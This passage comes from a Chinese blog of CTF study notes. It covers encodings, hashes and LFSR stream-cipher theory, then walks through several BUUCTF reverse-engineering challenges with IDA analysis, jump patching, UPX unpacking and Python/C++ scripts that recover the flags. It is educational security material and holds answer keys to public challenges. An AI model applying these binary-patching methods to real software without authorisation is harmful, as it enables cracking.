href="http://ctf.ssleye.com/base36w.html">在线解密</a>  </p></li><li><p><strong>base58:1到9，a到z，A到Z<a href="http://www.metools.info/code/c74.html">在线解密</a></strong>  </p></li><li><p><strong>base62:0到9，a到z，A到Z<a href="http://www.atoolbox.net/Tool.php?Id=933">在线解密</a></strong>  </p></li><li><p><strong>base64:a到z，A到Z，0到9，特别地有/+（可以转图片）<a href="https://tool.oschina.net/encrypt?type=3">在线解密</a></strong>  </p></li><li><p><strong>base91：A到Z，a到z，0到9，!#$%&amp;()*+,./:;&lt;=&gt;?@[]^_`{|}~）<a href="http://www.atoolbox.net/Tool.php?Id=935">在线解密</a></strong>  </p></li><li><p><strong>base92：0到9，A到Z，a到z，!#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_{|｝<a href="http://ctf.ssleye.com/base92.html">在线解密</a></strong>  </p></li><li><p><strong>base128：0到9，A到Z，a到z，\xb5\xb6\xb7\xbc\xbd\xbe\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</strong>  </p></li></ol><h3 id="Hash-哈希算法"><a href="#Hash-哈希算法" class="headerlink" title="Hash(哈希算法)"></a>Hash(哈希算法)</h3><h4 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h4><p>特征：md5加密后是16位或者32位的字符，由字母和数字组成，字母大小写统一；<br>理论上无法解密，除非暴力破解  </p><h4 id="SHA-1"><a href="#SHA-1" class="headerlink" title="SHA-1"></a>SHA-1</h4><p>特征：SHA-1加密后的密文是40个字符，并且由数字字母组成；  </p><h4 id="SHA-2"><a href="#SHA-2" class="headerlink" title="SHA-2"></a>SHA-2</h4><p>特征：SHA-2 又分为两种算法，SHA-224 和 SHA-256。两者生成的密文都是由 0-9a-fA-F 组成的，其中 SHA-224 的密文长度固定是 56，SHA-256 的密文长度是 64 。  </p><h3 id="流密码"><a href="#流密码" class="headerlink" title="流密码"></a>流密码</h3><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>原理:  </p><ul><li>利用密钥K产生一个密钥流z=z0z1z2…，并使用如下规则对明文串x=x0x1x2…加密：y=y0y1y2=Ez0(x0)Ez1(x1)Ez2(x2)…  </li><li>密钥流由密钥流发生器产生：Z=f(k,σi),这里σi是加密器中的记忆元件（储存器）在时刻i的状态，f是由密钥k和σi产生的函数。  </li></ul><p>其他：  </p><ul><li>分组密码与流密码的区别就在于有无记忆性  </li><li>同步流密码概念模型如下<br><img src="/2021/120547052/13.png" alt=" ">  </li><li>有限状态自动机逻辑类似逻辑设计学习中的现态次态状态表  </li><li>密钥流产生器  </li></ul><ol><li>一般组成为：一个参数为K的有限状态自动机，由一个输出符号集z、一个状态集Σ、两个函数φ和ψ以及一个初始状态σ0  </li><li>方式：状态转移函数φ：σi-&gt;σi+1，将当前状态σi变为一个新状态σi+1，输出函数ψ:σi-&gt;Zi，当前状态σi变为输出符号集中的一个元素Zi  </li><li>采用方法：非线性函数的方法  </li><li>作为有限状态自动机的密钥流生成器和密钥流生成器分解图如下：<br><img src="/2021/120547052/14.png" alt=" ">  </li><li>常见的两种密钥流产生器如下图<br><img src="/2021/120547052/15.png" alt=" ">  </li></ol><h4 id="线性反馈移位寄存器"><a href="#线性反馈移位寄存器" class="headerlink" title="线性反馈移位寄存器"></a>线性反馈移位寄存器</h4><ul><li>概念：移位寄存器是六密码产生密钥流的一个主要组成部分  </li><li>GF(2)上的n级反馈移位寄存器如下图<br><img src="/2021/120547052/16.png" alt=" ">  </li><li>我们常用的一般是这种：<br><img src="/2021/120547052/17.png" alt=" ">  </li><li>公式是：<br><img src="/2021/120547052/18.png" alt=" ">  </li><li>说明：其中的C1…Cn反应的应该是a0…an是否参与反馈，这种一般都会有一个周期  </li></ul><h4 id="线性反馈移位寄存器的一元多项式表示"><a href="#线性反馈移位寄存器的一元多项式表示" class="headerlink" title="线性反馈移位寄存器的一元多项式表示"></a>线性反馈移位寄存器的一元多项式表示</h4><ul><li>形式<br>设n级线性移位寄存器的输出序列{ai}满足递推关系：<br><img src="/2021/120547052/19.png" alt=" "><br>对任何K&gt;=1成立，这种递推关系可用一个一元高次多项式<br><img src="/2021/120547052/20.png" alt=" "><br>表示，称这个多项式为LFSR的特征多项式  </li><li>相关定理  </li></ul><p>2.1定义及定理<br><img src="/2021/120547052/21.png" alt=" "><br>2.2定理及定义<br><img src="/2021/120547052/22.png" alt=" "><br><img src="/2021/120547052/23.png" alt=" "><br><img src="/2021/120547052/24.png" alt=" "><br>2.3定义及定理<br><img src="/2021/120547052/25.png" alt=" "><br><img src="/2021/120547052/26.png" alt=" "><br>2.4定理<br><img src="/2021/120547052/27.png" alt=" "><br>2.5定理<br><img src="/2021/120547052/28.png" alt=" "><br>2.4定义和2.6定理<br><img src="/2021/120547052/29.png" alt=" "><br><img src="/2021/120547052/30.png" alt=" ">  </p><h4 id="m序列的伪随机性"><a href="#m序列的伪随机性" class="headerlink" title="m序列的伪随机性"></a>m序列的伪随机性</h4><ul><li>流密码的安全性取决于密钥流的安全性  </li><li>游程的概念：00110：0的2游程、1的2游程、0的1游程  </li><li>定义2.5<br><img src="/2021/120547052/31.png" alt=" ">  </li><li>Golomb对伪随机周期序列提出了应满足的如下三个随机性公设：  </li></ul><p>1.在序列的一个周期内，0与1的个数相差至多为1<br>2.在序列的一个周期内，长为1的游程占游程总数的1/2，长为2的游程占游程总数的(1/2)^2,…,长为i的游程占游程总数的(1/2)^i,且在等长的游程中0的游程个数和1的游程个数相等<br>3.异自相关函数是一个常数  </p><ul><li>从密码系统的角度看，一个伪随机序列还应满足下面的条件:  </li></ul><p>1.{ai}的周期相当大<br>2.{ai}的确定在计算上是容易的<br>3.{ai}由密文及相应的明文的部分信息,不能确定整个{ai}  </p><ul><li>定理2.7<br><img src="/2021/120547052/32.png" alt=" ">  </li></ul><h4 id="m序列的破译"><a href="#m序列的破译" class="headerlink" title="m序列的破译"></a>m序列的破译</h4><p>例如：<br>设敌手得到密文串101101011110010和相应的明文串  011001111111001，因此可计算出相应的密钥流为110100100001011。进一步假定敌手还知道密钥流是使用5级线性反馈移位寄存器产生的，那么敌手可分别用密文串中的前10个比特和明文串中的前10个比特建立如下方程<br><img src="/2021/120547052/33.png" alt=" "><br>之后：<br><img src="/2021/120547052/34.png" alt=" "><br>最后得到：<br><img src="/2021/120547052/35.png" alt=" ">  </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>逆向题</title>
      <link href="/2021/120454815.html"/>
      <url>/2021/120454815.html</url>
      
        <content type="html"><![CDATA[<h2 id="逆向题"><a href="#逆向题" class="headerlink" title="逆向题"></a>逆向题</h2><h3 id="招新时期的题-haha-exe"><a href="#招新时期的题-haha-exe" class="headerlink" title="招新时期的题:haha.exe"></a>招新时期的题:haha.exe</h3><ol><li>首先，这道题放入Exeinfo PE中查看这道题的简单情况如下:  </li></ol><p><img src="/2021/120454815/1.png" alt=" "></p><p>在这几个界面，首先 1 的位置显示的是文件的名称；2 的位置显示的是文件信息，如果加壳会显示是什么壳；3 的位置显示的文件是32位还是64位，便于分析；4 的位置显示的是编写这个文件使用的哪种语言；5 中最开始显示是否带壳；之后提示打开文件可以运用的文件<br>2. 其次，haha.exe这个文件是一个可运行的程序，但是当你打开输入信息的时候会自动闪退，放入32位ida的时候可以看到该main()函数的地址一致会变化，这也是程序打开闪退的原因，针对这个问题，可以使用 studyPE 这个软件来固定基址，从而解决闪退的问题。<br>3. 再一，文件打开之后，F5显示伪代码(语法神似c语言)，这时候根据之前文件的正常运行，会将含有flag信息的代码信息直接跳过，例如:<br><img src="/2021/120454815/2.png" alt=" ">类似上图一样，涵盖flag的信息全没有<br>4. 再二，返回初始界面，根据流程图进行分析<br><img src="/2021/120454815/3.png" alt=" "><br>分析可以知道在004012F4位置原来有一个跳转，上面那个语法会满足跳转条件，从而让我们想要的信息被跳过，所以这时候我们需要将它nop掉来阻止跳转，结果如图<br>5. 再三，在进行上述操作之后，可以再次找到main(),F5显示伪代码，这个时候就可以分析了，看下图<br><img src="/2021/120454815/4.png" alt=" "><br>在这个图里分析可以看到，输入 1 会得到一个flag.doc文件，2走迷宫，3退出，同时分析知flag.doc打开之后要密码，即我们要走迷宫，然后分析到sub_401120()这里，点开如下<br><img src="/2021/120454815/6.png" alt=" "><br>在这里可以看到用wasd走迷宫，同时分析知迷宫格式在V5=dword_403300[v4 + v2]这里，之后走迷宫即可，之后得到的字符串需要在LABEL_15地址进行异或操作，得到真正的密码字符串<br>6. 最后，如下图<br><img src="/2021/120454815/7.png" alt=" "><br>最后flag改为henu，同时注意最好以命令行的形式打开.exe文件，不然还是会出现闪退的问题(这个应该不是基址的问题了)<br>7. 总结：<br>关键点:固定基址，除掉跳转(nop),程序打开方式  </p><h3 id="BUUCTF-reverse3-含base64加密"><a href="#BUUCTF-reverse3-含base64加密" class="headerlink" title="BUUCTF-reverse3(含base64加密)"></a>BUUCTF-reverse3(含base64加密)</h3><ol><li>用exeinfope.exe程序查看题的情况<br><img src="/2021/120454815/8.png" alt=" ">  </li><li>用32为ida打开文件，之后再边框下拉到最下面找到main函数入口，之后F5打开反汇编窗口。<br><img src="/2021/120454815/9.png" alt=" "><br><img src="/2021/120454815/10.png" alt=" ">  </li><li>之后可以看到如上诉照片的情况，依次分析  <ul><li>加密<br><img src="/2021/120454815/11.png" alt=" "><br><img src="/2021/120454815/12.png" alt=" "><br>可以看到此加密方式是base64加密方式  </li><li>算法处理  </li><li>比较操作之后的flag与str2的大小，所以我们可以先找到str2的字符串之后进行一系列上述操作解出flag<br><img src="/2021/120454815/13.png" alt=" "><br>str2字符串  </li></ul></li><li>脚本  </li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64s <span class="token operator">=</span> <span class="token string">"e3nifIH9b_C@n@dH"</span>x <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    x <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="buuctf-SimpleRev-字符串的组合，输入判断"><a href="#buuctf-SimpleRev-字符串的组合，输入判断" class="headerlink" title="buuctf SimpleRev(字符串的组合，输入判断)"></a>buuctf SimpleRev(字符串的组合，输入判断)</h3><ol><li>用exeinfope.exe程序查看题的情况<br><img src="/2021/120454815/14.png" alt=" ">  </li><li>之后用64位IDA打开文件，找到对应的main函数之后F5打开反汇编窗口<br><img src="/2021/120454815/15.png" alt=" "><br>可以看到一个关键(Decry()),之后双击点开<br><img src="/2021/120454815/16.png" alt=" "><br><img src="/2021/120454815/17.png" alt=" ">  </li><li>1处：我们首先将*src,v9的16进制数据转换成字符串形式<br>2处：进行了三次组合:text = key3+v9,key = key +key1,key=key+src,三个依次进行，同时key1和key3可以直接双击点开查看<br>3处：进行变换，将key字符串中的大写字母变换成小写字母<br>4处：输入v1，同时知道输入字符之间有空格<br>5处：算法进行求str2<br>6处：test与str2进行比较，相同即满足条件  </li><li>脚本  </li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">src <span class="token operator">=</span> <span class="token string">'NDCLS'</span>v9 <span class="token operator">=</span> <span class="token string">'hadow'</span>key1 <span class="token operator">=</span> <span class="token string">'ADSFK'</span>key3 <span class="token operator">=</span> <span class="token string">'kills'</span>text1 <span class="token operator">=</span> key3 <span class="token operator">+</span> v9       <span class="token comment"># 这里的text1相当于 text = key3 + v9</span>text2 <span class="token operator">=</span> key1 <span class="token operator">+</span> src      <span class="token comment"># 这里的text2相当于 key = key1 + src</span>text2 <span class="token operator">=</span> text2<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment"># 需要把大学字母变为小写字母</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>text1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment"># 这里用暴力求解</span>        <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 这里要加上判断x是否是字符串</span>            temp <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">39</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>text2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span>            <span class="token keyword">if</span> text1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">:</span>                   flag <span class="token operator">=</span> flag <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag&#123;"</span><span class="token operator">+</span>flag<span class="token operator">+</span><span class="token string">"&#125;"</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="BUUCTF-ACTF新生赛2020-easyre"><a href="#BUUCTF-ACTF新生赛2020-easyre" class="headerlink" title="BUUCTF [ACTF新生赛2020]easyre"></a>BUUCTF [ACTF新生赛2020]easyre</h3><ol><li>先查看文件信息，发现含有upx壳，之后用解壳工具upx或者od手动脱壳，之后拖入32位ida，找到main函数–&gt;F5<br><img src="/2021/120454815/18.png" alt=" "></li><li>1处：将字符串*F’&quot;N,&quot;(I?+@复制给V4<br>2处：R字符串转换可以看出与flag有关，且结合第三处可以知道，flag有12位<br>3处：进行查询变换，点开3处的_data_start__(),可以看到以下情况<br><img src="/2021/120454815/19.png" alt=" "><br>再结合三处情况可以知道，<em>data_start</em>_()里的字符串[i]-1，如果与v4[i]相等，则该字符串[i]即为flag里的一个字符串  </li><li>脚本  </li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag1 <span class="token operator">=</span> <span class="token string">"*F'\"N,\"(I?+@"</span>s <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>flag1<span class="token punctuation">)</span>flag<span class="token operator">=</span><span class="token string">""</span>string <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x7E</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=&lt;;:9876543210/.-,+*)("</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x27</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&amp;%$# !"'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> flag1<span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>string<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"flag&#123;"</span><span class="token operator">+</span>flag<span class="token operator">+</span><span class="token string">"&#125;"</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="BUUCTF-2019红帽杯-easyRE"><a href="#BUUCTF-2019红帽杯-easyRE" class="headerlink" title="BUUCTF [2019红帽杯]easyRE"></a>BUUCTF [2019红帽杯]easyRE</h3><ol><li>查看文件情况，无壳，64位，之后ida打开，发现没有main函数，之后shirt+F12，看到字符串You found me!!!双击，之后根据旁边找到它的地址在他地址进行反汇编<br><img src="/2021/120454815/20.png" alt=" "><br><img src="/2021/120454815/21.png" alt=" ">  </li><li>1、2、3处：将字符串分别复制给v12、v13、v14、同时v12[12] = 127 v13[3] = 127<br>4处：我们可以知道所求的字符串的长度是36<br>5处：进行了一个36位长度的异或操作，同时猜想可以知道此时的v12就是上述v12、v13、v14<br>之后疑惑可以指的，含有flag字符串，但不是我们想要的<br><img src="/2021/120454815/22.png" alt=" ">  </li><li>之后我们向下分析，可以看到这个图片里的东西，之后点开可以发现一串字符串，且编码形式是base64，我们将其解密到最后会发现最后给的是一个地址，不是flag<br><img src="/2021/120454815/23.png" alt=" ">  </li><li>继续向下分析，可以看到这里调用了off_6CC090，点开可以看到下面情况<br><img src="/2021/120454815/24.png" alt=" ">  </li><li>6处：我们之后会用到<br>7处：我们点击，之后跳到对应位置F5<br><img src="/2021/120454815/25.png" alt=" ">  </li><li>这才是flag的藏身之地，由上面那个箭头，我们可以猜出v1==v4==flag<br>之后我们用下面那个箭头所指结合6处和v4求出flag  </li><li>脚本  </li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">v5 <span class="token operator">=</span> <span class="token string">''</span>enc1 <span class="token operator">=</span> <span class="token string">'flag'</span>v2 <span class="token operator">=</span> <span class="token string">''</span>enc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token number">0x35</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x56</span><span class="token punctuation">,</span><span class="token number">0x5D</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">0x22</span><span class="token punctuation">,</span><span class="token number">0x45</span><span class="token punctuation">,</span><span class="token number">0x17</span><span class="token punctuation">,</span><span class="token number">0x2F</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">,</span><span class="token number">0x6E</span><span class="token punctuation">,</span><span class="token number">0x62</span><span class="token punctuation">,</span><span class="token number">0x3C</span><span class="token punctuation">,</span><span class="token number">0x27</span><span class="token punctuation">,</span><span class="token number">0x54</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x6C</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">,</span><span class="token number">0x6E</span><span class="token punctuation">,</span><span class="token number">0x72</span><span class="token punctuation">,</span><span class="token number">0x3C</span><span class="token punctuation">,</span><span class="token number">0x32</span><span class="token punctuation">,</span><span class="token number">0x45</span><span class="token punctuation">,</span><span class="token number">0x5B</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v5 <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>enc1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v2 <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>v5<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="BUUCTF-MRCTF2020-Xor-扩展思维"><a href="#BUUCTF-MRCTF2020-Xor-扩展思维" class="headerlink" title="BUUCTF [MRCTF2020]Xor(扩展思维)"></a>BUUCTF [MRCTF2020]Xor(扩展思维)</h3><ol><li>查看文件情况，无壳，32位，之后ida打开，发现main函数，在main函数位置进行反汇编，发现如下情况<br><img src="/2021/120454815/26.png" alt=" ">  </li><li>之后到对应位置<br><img src="/2021/120454815/27.png" alt=" "><br>分析发现是无法正确识别调用问题的原因(call analysis failed问题总结于逆向中的一些基础中)  </li><li>之后在该位置进行双击进入该函数，并反汇编，然后在对main函数进行反汇编就行了<br><img src="/2021/120454815/28.png" alt=" ">  </li><li>该题脚本  </li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag <span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">77</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'SAWB~FXZ:J:`tQJ"N@ bpdd&#125;8g'</span>s <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span>i<span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="BUUCTF-WUSTCTF2020-level1-文件读写"><a href="#BUUCTF-WUSTCTF2020-level1-文件读写" class="headerlink" title="BUUCTF [WUSTCTF2020]level1(文件读写)"></a>BUUCTF [WUSTCTF2020]level1(文件读写)</h3><ol><li>查看文件情况，无壳，64位，之后ida打开，发现main函数，在main函数位置进行反汇编<br><img src="/2021/120454815/29.png" alt=" ">  </li><li>1处：对文件flag进行读操作，可以猜想其实就是将flag读过来<br>2处：将读入的flag赋值给ptr<br>3处：关闭原文件<br>4处：对得到的flag进行一个简单的算法操作  </li><li>首先如果我们如果双击flag，我们会很“巧合”的发现下方正好有一个好像符合长度的一串16禁止数据，如下图<br><img src="/2021/120454815/30.png" alt=" "><br>之后我们对其进行编写脚本，发现这并不是我们想要的flag  </li><li>之后我们考虑、刚开始我们解压缩的时候还得到了一个.txt文件，总所周知，大部分情况有读就要有写吧，然后我们去打开那个.txt文件，发现一串数据，正好19个<br><img src="/2021/120454815/31.png" alt=" "><br>之后我们对这一串数据进行脚本，发现最后正好得到flag，大功告成  </li><li>脚本  </li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">ptr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">198</span><span class="token punctuation">,</span><span class="token number">232</span><span class="token punctuation">,</span><span class="token number">816</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">1536</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">6144</span><span class="token punctuation">,</span><span class="token number">984</span><span class="token punctuation">,</span><span class="token number">51200</span><span class="token punctuation">,</span><span class="token number">570</span><span class="token punctuation">,</span><span class="token number">92160</span><span class="token punctuation">,</span><span class="token number">1200</span><span class="token punctuation">,</span><span class="token number">565248</span><span class="token punctuation">,</span><span class="token number">756</span><span class="token punctuation">,</span><span class="token number">1474560</span><span class="token punctuation">,</span><span class="token number">800</span><span class="token punctuation">,</span><span class="token number">6291456</span><span class="token punctuation">,</span><span class="token number">1782</span><span class="token punctuation">,</span><span class="token number">65536000</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">//</span> <span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="BUUCTF-GWCTF-2019-xxor-类似tea加密"><a href="#BUUCTF-GWCTF-2019-xxor-类似tea加密" class="headerlink" title="BUUCTF [GWCTF 2019]xxor(类似tea加密)"></a>BUUCTF [GWCTF 2019]xxor(类似tea加密)</h3><ol><li>查看文件情况，无壳，64位，之后ida打开，发现main函数，在main函数位置进行反汇编<br><img src="/2021/120454815/32.png" alt=" ">  </li><li>1处：我们可以看出其实我们输入的应该是v6，最后进行求a2，我们猜想下a2可能是我们要的flag，但是下面第三部却对a2进行了赋值，这就导致猜错了，不过不慌，继续向下看<br>2处：进行循环 3次循环（关键点别忘了）<br>3处：对a2进行赋值，如下图<br><img src="/2021/120454815/33.png" alt=" "><br>4处：是对a1的6个数值进行的类似tea加密的操作，但不是严格tea加密形式，并且每次操作a1的两位数据<br><img src="/2021/120454815/34.png" alt=" "><br>5处：是对a1的6位数值的计算位置，在这个位置可以得出a1的6个值<br>6处：对于得到的16进制数值要转化为字符串(自己写的python代码没转化成，就去网上扣了一个c++的脚本)  </li><li>整体看完之后，我们可以直观的分析到我们其实要的就是最初的a1的那6个数值，所以在这里我们首先要求出a1的最终数值，之后从下到上反向的操作，求最初的数据<br>在5处，我们可以先求出a1的最终数据，因为这里只是简单的赋值，减法操作，其实我们可以很简单就写出来，就不附加上脚本了，之后我们在4处进行逆运算求最初的a1的6个数值即可  </li><li>脚本  </li></ol><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;#pragma warning(disable:4996)using namespace std;int main()&#123;    __int64 a[6] &#x3D; &#123; 3746099070, 550153460, 3774025685, 1548802262, 2652626477, 2230518816 &#125;;    unsigned int a2[4] &#x3D; &#123; 2,2,3,4 &#125;;    unsigned int v3, v4;    int v5;    for (int j &#x3D; 0; j &lt;&#x3D; 4; j +&#x3D; 2) &#123;        v3 &#x3D; a[j];        v4 &#x3D; a[j + 1];        v5 &#x3D; 1166789954*0x40;        for (int i &#x3D; 0; i &lt;&#x3D; 0x3F; ++i) &#123;            v4 -&#x3D; (v3 + v5 